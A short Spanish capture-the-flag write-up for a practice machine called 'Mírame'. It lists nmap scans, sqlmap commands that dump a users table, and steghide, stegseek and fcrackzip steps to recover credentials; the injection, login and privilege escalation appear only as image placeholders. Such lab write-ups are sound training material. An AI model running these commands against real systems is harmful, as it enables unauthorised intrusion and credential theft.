# Máquina Mírame
 
### Puertos abiertos

sudo nmap -sS --min-rate 6000 -p- --open -vvv -Pn 172.17.0.1

![alt text](image.png)

### Servicios y versiones

sudo nmap -sVC --min-rate 6000 -p22,80 -vvv -Pn 172.17.0.1

![alt text](image-1.png)

### FUZZING WEB

![alt text](image-2.png)

### Entramos en la web

http://172.17.0.1/index.php


aplicando slqi:

![alt text](image-3.png)


### SQLMap

sqlmap -u "http://172.17.0.1/index.php" --forms --batch --dbs

![alt text](image-4.png)

sqlmap -u "http://172.17.0.1/index.php" --forms --batch -D users --tables

![alt text](image-5.png)

sqlmap -u "http://172.17.0.1/index.php" --forms --batch -D users -T usuarios --dump

![alt text](image-7.png)

utilizamos como directorio la contraseña directoriotravieso e ingresamos:

![alt text](image-8.png)

descargamos la imagen.

utilizamos la herramienta steghide, luego la herramienta stegseek y luego la herramienta fcrackzip:

![alt text](image-9.png)

![alt text](image-10.png)


### Intrusión

Nos conectamos con las credenciales encontradas:

![alt text](image-11.png)

### Escalar privilegios

![alt text](image-12.png)